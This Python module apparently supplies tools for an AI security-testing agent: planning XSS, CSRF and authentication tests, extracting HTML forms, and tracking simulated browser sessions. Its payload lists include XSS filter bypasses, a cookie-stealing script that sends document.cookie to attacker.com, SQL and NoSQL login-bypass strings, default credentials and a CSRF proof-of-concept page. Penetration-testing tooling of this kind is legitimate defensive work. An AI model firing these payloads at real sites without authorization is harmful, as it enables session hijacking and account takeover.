"""
Browser Automation Runtime - Multi-tab Browser Testing for XSS, CSRF, and Auth Flow.

Provides headless browser automation capabilities for security testing:
- XSS payload execution verification
- CSRF token extraction and manipulation
- Authentication flow testing
- Multi-tab session management
- Form submission automation
- JavaScript execution

Note: This module provides simulation and planning capabilities.
For actual browser automation, integrate with Playwright or Selenium.
"""

from __future__ import annotations

import re
import uuid
import logging
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Literal
from urllib.parse import urlparse, parse_qs, urljoin

from ..tools.registry import register_tool

logger = logging.getLogger(__name__)

# Browser session storage
_browser_sessions: Dict[str, Dict[str, Any]] = {}
_browser_tabs: Dict[str, Dict[str, Any]] = {}


def _generate_session_id() -> str:
    """Generate a browser session ID."""
    return f"browser_{uuid.uuid4().hex[:8]}"


def _generate_tab_id() -> str:
    """Generate a tab ID."""
    return f"tab_{uuid.uuid4().hex[:8]}"


@register_tool(sandbox_execution=False, category="browser")
def create_browser_session(
    agent_state: Any,
    name: Optional[str] = None,
    user_agent: Optional[str] = None,
    viewport: Optional[Dict[str, int]] = None,
    cookies: Optional[List[Dict[str, str]]] = None,
) -> Dict[str, Any]:
    """
    Create a new browser session for testing.
    
    Sessions maintain cookies and state across tabs, simulating
    a real browser environment.
    
    Args:
        agent_state: Current agent state
        name: Session name
        user_agent: Custom user agent
        viewport: Viewport size {"width": 1920, "height": 1080}
        cookies: Initial cookies to set
    
    Returns:
        Dictionary with session creation status
    """
    session_id = _generate_session_id()
    
    session = {
        "id": session_id,
        "name": name or session_id,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "user_agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "viewport": viewport or {"width": 1920, "height": 1080},
        "cookies": cookies or [],
        "tabs": [],
        "storage": {"local": {}, "session": {}},
        "history": [],
    }
    
    _browser_sessions[session_id] = session
    
    return {
        "success": True,
        "session_id": session_id,
        "name": session["name"],
        "message": "Browser session created. Use create_tab() to open pages.",
    }


@register_tool(sandbox_execution=False, category="browser")
def create_tab(
    agent_state: Any,
    session_id: str,
    url: Optional[str] = None,
    name: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Create a new tab in a browser session.
    
    Args:
        agent_state: Current agent state
        session_id: Browser session ID
        url: Initial URL to navigate to
        name: Tab name for identification
    
    Returns:
        Dictionary with tab creation status
    """
    if session_id not in _browser_sessions:
        return {"success": False, "error": f"Session '{session_id}' not found"}
    
    session = _browser_sessions[session_id]
    tab_id = _generate_tab_id()
    
    tab = {
        "id": tab_id,
        "session_id": session_id,
        "name": name or tab_id,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "current_url": url or "about:blank",
        "title": "New Tab",
        "dom_snapshot": None,
        "cookies": [],
        "console_logs": [],
        "network_requests": [],
        "forms": [],
        "scripts_executed": [],
    }
    
    _browser_tabs[tab_id] = tab
    session["tabs"].append(tab_id)
    
    return {
        "success": True,
        "tab_id": tab_id,
        "session_id": session_id,
        "url": tab["current_url"],
        "message": f"Tab created. Use navigate() to load pages.",
    }


@register_tool(sandbox_execution=False, category="browser")
def plan_xss_test(
    agent_state: Any,
    target_url: str,
    injection_points: List[Dict[str, str]],
    payloads: Optional[List[str]] = None,
    detection_method: Literal["alert", "dom_change", "callback", "cookie"] = "alert",
    callback_url: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Plan an XSS testing workflow.
    
    Creates a comprehensive test plan for XSS verification including
    payload delivery and verification steps.
    
    Args:
        agent_state: Current agent state
        target_url: URL to test
        injection_points: List of injection points [{"type": "param", "name": "q"}]
        payloads: Custom payloads (uses defaults if not provided)
        detection_method: How to detect successful XSS
        callback_url: URL for callback-based detection
    
    Returns:
        Dictionary with XSS test plan
    """
    default_payloads = [
        # Basic payloads
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        
        # Event handlers
        "\" onmouseover=\"alert('XSS')\" x=\"",
        "' onclick='alert(1)' x='",
        
        # JavaScript URI
        "javascript:alert('XSS')",
        
        # DOM-based
        "#<script>alert('XSS')</script>",
        
        # Filter bypasses
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">",
    ]
    
    payloads = payloads or default_payloads
    
    test_plan = {
        "id": f"xss_test_{uuid.uuid4().hex[:8]}",
        "target_url": target_url,
        "detection_method": detection_method,
        "callback_url": callback_url,
        "injection_points": injection_points,
        "total_tests": len(injection_points) * len(payloads),
        "tests": [],
    }
    
    # Generate test cases
    for point in injection_points:
        point_type = point.get("type", "param")
        point_name = point.get("name", "unknown")
        
        for i, payload in enumerate(payloads):
            test_case = {
                "test_id": f"test_{len(test_plan['tests']) + 1}",
                "injection_point": point,
                "payload": payload,
                "detection_payload": None,
                "verification_steps": [],
            }
            
            # Customize detection payload based on method
            if detection_method == "alert":
                test_case["detection_payload"] = payload
                test_case["verification_steps"] = [
                    f"1. Navigate to {target_url}",
                    f"2. Inject payload into {point_type} '{point_name}'",
                    "3. Look for JavaScript alert box",
                    "4. If alert appears, XSS is confirmed",
                ]
            elif detection_method == "dom_change":
                marker = f"xss_marker_{uuid.uuid4().hex[:4]}"
                modified_payload = payload.replace("alert('XSS')", f"document.body.innerHTML+='{marker}'")
                test_case["detection_payload"] = modified_payload
                test_case["verification_steps"] = [
                    f"1. Navigate to {target_url}",
                    f"2. Inject payload into {point_type} '{point_name}'",
                    f"3. Check if '{marker}' appears in page content",
                    "4. If marker present, XSS is confirmed",
                ]
            elif detection_method == "callback":
                if callback_url:
                    cb_payload = f"<script>fetch('{callback_url}?xss='+document.domain)</script>"
                    test_case["detection_payload"] = cb_payload
                    test_case["verification_steps"] = [
                        f"1. Set up listener at {callback_url}",
                        f"2. Navigate to {target_url}",
                        f"3. Inject callback payload into {point_type} '{point_name}'",
                        "4. Check callback server for incoming request",
                        "5. If request received, XSS is confirmed",
                    ]
            elif detection_method == "cookie":
                cookie_payload = "<script>document.location='//attacker.com/?c='+document.cookie</script>"
                test_case["detection_payload"] = cookie_payload
                test_case["verification_steps"] = [
                    f"1. Navigate to {target_url}",
                    f"2. Inject cookie-stealing payload into {point_type} '{point_name}'",
                    "3. Check for redirect or request with cookies",
                    "4. If cookies captured, XSS is confirmed",
                ]
            
            test_plan["tests"].append(test_case)
    
    return {
        "success": True,
        "test_plan": test_plan,
        "summary": {
            "target": target_url,
            "injection_points": len(injection_points),
            "payloads": len(payloads),
            "total_tests": test_plan["total_tests"],
            "detection_method": detection_method,
        },
        "next_steps": [
            "Review the test plan",
            "Execute tests using http_request() or browser automation",
            "Verify results based on detection method",
        ],
    }


@register_tool(sandbox_execution=False, category="browser")
def plan_csrf_test(
    agent_state: Any,
    target_url: str,
    method: str = "POST",
    parameters: Dict[str, str] = None,
    authenticated: bool = True,
    token_location: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Plan a CSRF testing workflow.
    
    Creates test plan for CSRF verification including token analysis
    and PoC generation.
    
    Args:
        agent_state: Current agent state
        target_url: Target form/action URL
        method: HTTP method
        parameters: Form parameters
        authenticated: Whether action requires authentication
        token_location: Where CSRF token is expected (form, header, cookie)
    
    Returns:
        Dictionary with CSRF test plan
    """
    test_plan = {
        "id": f"csrf_test_{uuid.uuid4().hex[:8]}",
        "target_url": target_url,
        "method": method,
        "parameters": parameters or {},
        "authenticated": authenticated,
        "token_location": token_location,
        "tests": [],
    }
    
    # Test 1: No token
    test_plan["tests"].append({
        "name": "Request without CSRF token",
        "description": "Test if the action can be performed without any CSRF token",
        "steps": [
            "1. Authenticate to the application",
            "2. Capture the target request",
            "3. Remove any CSRF token from the request",
            "4. Replay the request",
            "5. Check if action succeeds",
        ],
        "expected_secure": "Request should fail or require token",
    })
    
    # Test 2: Empty token
    test_plan["tests"].append({
        "name": "Request with empty CSRF token",
        "description": "Test if empty token is accepted",
        "steps": [
            "1. Authenticate to the application",
            "2. Capture the target request",
            "3. Set CSRF token to empty string",
            "4. Send the request",
            "5. Check if action succeeds",
        ],
        "expected_secure": "Empty token should be rejected",
    })
    
    # Test 3: Token from different session
    test_plan["tests"].append({
        "name": "Token from different session",
        "description": "Test if token is bound to user session",
        "steps": [
            "1. Log in as User A, capture CSRF token",
            "2. Log in as User B",
            "3. Use User A's token for User B's action",
            "4. Check if action succeeds",
        ],
        "expected_secure": "Token should be rejected",
    })
    
    # Test 4: Predictable token
    test_plan["tests"].append({
        "name": "Token predictability analysis",
        "description": "Check if CSRF tokens are predictable",
        "steps": [
            "1. Collect multiple CSRF tokens",
            "2. Analyze for patterns (sequential, timestamp-based)",
            "3. Attempt to predict next token",
            "4. Use predicted token in request",
        ],
        "expected_secure": "Tokens should be cryptographically random",
    })
    
    # Generate PoC HTML
    form_params = "\n".join([
        f'    <input type="hidden" name="{k}" value="{v}">'
        for k, v in (parameters or {}).items()
    ])
    
    poc_html = f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>Click the button to test CSRF vulnerability</p>
    
    <form id="csrf-form" action="{target_url}" method="{method}">
{form_params}
        <input type="submit" value="Submit">
    </form>
    
    <!-- Auto-submit version (uncomment to use) -->
    <!-- <script>document.getElementById('csrf-form').submit();</script> -->
</body>
</html>'''
    
    test_plan["poc_html"] = poc_html
    
    return {
        "success": True,
        "test_plan": test_plan,
        "poc_html": poc_html,
        "summary": {
            "target": target_url,
            "method": method,
            "total_tests": len(test_plan["tests"]),
            "requires_authentication": authenticated,
        },
        "detection_tips": [
            "Look for state-changing actions that succeed without valid tokens",
            "Check if tokens are validated on server side",
            "Verify token binding to session",
            "Test token reuse across sessions",
        ],
    }


@register_tool(sandbox_execution=False, category="browser")
def plan_auth_test(
    agent_state: Any,
    login_url: str,
    login_params: Dict[str, str],
    protected_url: str,
    logout_url: Optional[str] = None,
    session_cookie_name: str = "session",
) -> Dict[str, Any]:
    """
    Plan authentication flow testing.
    
    Creates comprehensive test plan for authentication security
    including session management and access control.
    
    Args:
        agent_state: Current agent state
        login_url: Login form/API URL
        login_params: Login parameters (username, password fields)
        protected_url: URL that requires authentication
        logout_url: Logout URL
        session_cookie_name: Name of session cookie
    
    Returns:
        Dictionary with auth test plan
    """
    test_plan = {
        "id": f"auth_test_{uuid.uuid4().hex[:8]}",
        "login_url": login_url,
        "protected_url": protected_url,
        "logout_url": logout_url,
        "tests": [],
    }
    
    # Authentication bypass tests
    test_plan["tests"].extend([
        {
            "name": "SQL Injection in login",
            "category": "auth_bypass",
            "payloads": {
                "username": ["admin'--", "' OR '1'='1", "admin'/*"],
                "password": ["' OR '1'='1'--", "password"],
            },
            "description": "Test for SQL injection in login form",
        },
        {
            "name": "NoSQL Injection in login",
            "category": "auth_bypass",
            "payloads": {
                "username": ['{"$ne": ""}', '{"$gt": ""}'],
                "password": ['{"$ne": ""}'],
            },
            "description": "Test for NoSQL injection in login",
        },
        {
            "name": "Default credentials",
            "category": "auth_bypass",
            "payloads": {
                "combinations": [
                    ("admin", "admin"),
                    ("admin", "password"),
                    ("root", "root"),
                    ("administrator", "administrator"),
                    ("user", "user"),
                    ("test", "test"),
                ],
            },
            "description": "Test common default credentials",
        },
    ])
    
    # Session management tests
    test_plan["tests"].extend([
        {
            "name": "Session fixation",
            "category": "session",
            "steps": [
                "1. Get a session cookie before login",
                "2. Log in with valid credentials",
                "3. Check if session cookie changed",
                "4. If same cookie, session fixation is possible",
            ],
        },
        {
            "name": "Session timeout",
            "category": "session",
            "steps": [
                "1. Log in and note session cookie",
                "2. Wait for timeout period",
                "3. Attempt to access protected resource",
                "4. Verify session is invalidated",
            ],
        },
        {
            "name": "Concurrent sessions",
            "category": "session",
            "steps": [
                "1. Log in from browser A",
                "2. Log in from browser B (same user)",
                "3. Check if browser A session is invalidated",
                "4. Or both sessions remain active (may be a finding)",
            ],
        },
        {
            "name": "Logout effectiveness",
            "category": "session",
            "steps": [
                "1. Log in and capture session cookie",
                "2. Log out through normal process",
                "3. Replay request with captured session cookie",
                "4. Verify session is invalidated server-side",
            ],
        },
    ])
    
    # Access control tests
    test_plan["tests"].extend([
        {
            "name": "Direct URL access",
            "category": "access_control",
            "steps": [
                f"1. Try to access {protected_url} without authentication",
                "2. Check response (should redirect to login or deny)",
            ],
        },
        {
            "name": "Horizontal privilege escalation",
            "category": "access_control",
            "steps": [
                "1. Log in as User A",
                "2. Access User A's resources, note URL pattern",
                "3. Try to access User B's resources by modifying IDs",
                "4. Check if access is denied",
            ],
        },
        {
            "name": "Vertical privilege escalation",
            "category": "access_control",
            "steps": [
                "1. Log in as regular user",
                "2. Try to access admin endpoints",
                "3. Try to modify role parameters",
                "4. Check if elevated access is granted",
            ],
        },
    ])
    
    return {
        "success": True,
        "test_plan": test_plan,
        "summary": {
            "login_url": login_url,
            "protected_url": protected_url,
            "total_tests": len(test_plan["tests"]),
            "categories": list(set(t.get("category", "other") for t in test_plan["tests"])),
        },
        "recommendations": [
            "Test each category systematically",
            "Document session cookie behavior",
            "Check for rate limiting on login",
            "Verify error messages don't leak info",
        ],
    }


@register_tool(sandbox_execution=False, category="browser")
def extract_forms(
    agent_state: Any,
    html_content: str,
    base_url: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Extract forms from HTML content for testing.
    
    Parses HTML to find forms, their actions, methods, and input fields.
    
    Args:
        agent_state: Current agent state
        html_content: HTML content to parse
        base_url: Base URL for resolving relative URLs
    
    Returns:
        Dictionary with extracted forms
    """
    forms = []
    
    # Simple regex-based form extraction
    form_pattern = r'<form[^>]*>([\s\S]*?)</form>'
    form_matches = re.finditer(form_pattern, html_content, re.IGNORECASE)
    
    for i, match in enumerate(form_matches):
        form_html = match.group(0)
        form_content = match.group(1)
        
        # Extract action
        action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        action = action_match.group(1) if action_match else ""
        if base_url and action and not action.startswith(('http://', 'https://')):
            action = urljoin(base_url, action)
        
        # Extract method
        method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        method = (method_match.group(1) if method_match else "GET").upper()
        
        # Extract enctype
        enctype_match = re.search(r'enctype=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        enctype = enctype_match.group(1) if enctype_match else "application/x-www-form-urlencoded"
        
        # Extract inputs
        inputs = []
        input_pattern = r'<input[^>]*>'
        input_matches = re.findall(input_pattern, form_content, re.IGNORECASE)
        
        for input_html in input_matches:
            input_info = {
                "type": "text",
                "name": "",
                "value": "",
                "required": "required" in input_html.lower(),
            }
            
            type_match = re.search(r'type=["\']([^"\']*)["\']', input_html, re.IGNORECASE)
            if type_match:
                input_info["type"] = type_match.group(1).lower()
            
            name_match = re.search(r'name=["\']([^"\']*)["\']', input_html, re.IGNORECASE)
            if name_match:
                input_info["name"] = name_match.group(1)
            
            value_match = re.search(r'value=["\']([^"\']*)["\']', input_html, re.IGNORECASE)
            if value_match:
                input_info["value"] = value_match.group(1)
            
            if input_info["name"]:  # Only include inputs with names
                inputs.append(input_info)
        
        # Extract textareas
        textarea_pattern = r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>'
        textarea_matches = re.findall(textarea_pattern, form_content, re.IGNORECASE)
        for name in textarea_matches:
            inputs.append({
                "type": "textarea",
                "name": name,
                "value": "",
                "required": False,
            })
        
        # Extract selects
        select_pattern = r'<select[^>]*name=["\']([^"\']*)["\'][^>]*>'
        select_matches = re.findall(select_pattern, form_content, re.IGNORECASE)
        for name in select_matches:
            inputs.append({
                "type": "select",
                "name": name,
                "value": "",
                "required": False,
            })
        
        form_info = {
            "index": i,
            "action": action,
            "method": method,
            "enctype": enctype,
            "inputs": inputs,
            "has_csrf_token": any(
                "csrf" in inp["name"].lower() or "token" in inp["name"].lower()
                for inp in inputs if inp["name"]
            ),
            "has_file_upload": any(inp["type"] == "file" for inp in inputs),
            "has_password": any(inp["type"] == "password" for inp in inputs),
        }
        
        forms.append(form_info)
    
    # Identify interesting forms for security testing
    interesting_forms = []
    for form in forms:
        reasons = []
        if form["has_password"]:
            reasons.append("Contains password field (login/registration)")
        if form["has_file_upload"]:
            reasons.append("File upload functionality")
        if not form["has_csrf_token"]:
            reasons.append("Missing CSRF token")
        if form["method"] == "POST":
            reasons.append("POST form (likely state-changing)")
        
        if reasons:
            interesting_forms.append({
                "form_index": form["index"],
                "action": form["action"],
                "reasons": reasons,
            })
    
    return {
        "success": True,
        "total_forms": len(forms),
        "forms": forms,
        "interesting_forms": interesting_forms,
        "security_notes": [
            f"{len([f for f in forms if not f['has_csrf_token']])} forms missing CSRF tokens",
            f"{len([f for f in forms if f['has_file_upload']])} forms with file upload",
            f"{len([f for f in forms if f['has_password']])} forms with password fields",
        ],
    }


@register_tool(sandbox_execution=False, category="browser")
def list_browser_sessions(agent_state: Any) -> Dict[str, Any]:
    """
    List all browser sessions.
    
    Returns:
        Dictionary with session list
    """
    sessions = []
    
    for sid, session in _browser_sessions.items():
        sessions.append({
            "session_id": sid,
            "name": session["name"],
            "created_at": session["created_at"],
            "tab_count": len(session["tabs"]),
            "cookie_count": len(session["cookies"]),
        })
    
    return {
        "success": True,
        "session_count": len(sessions),
        "sessions": sessions,
    }


@register_tool(sandbox_execution=False, category="browser")
def close_browser_session(agent_state: Any, session_id: str) -> Dict[str, Any]:
    """
    Close a browser session and all its tabs.
    
    Args:
        agent_state: Current agent state
        session_id: Session to close
    
    Returns:
        Dictionary with closure status
    """
    if session_id not in _browser_sessions:
        return {"success": False, "error": f"Session '{session_id}' not found"}
    
    session = _browser_sessions.pop(session_id)
    
    # Remove all tabs
    for tab_id in session["tabs"]:
        _browser_tabs.pop(tab_id, None)
    
    return {
        "success": True,
        "session_id": session_id,
        "tabs_closed": len(session["tabs"]),
        "message": "Browser session closed",
    }
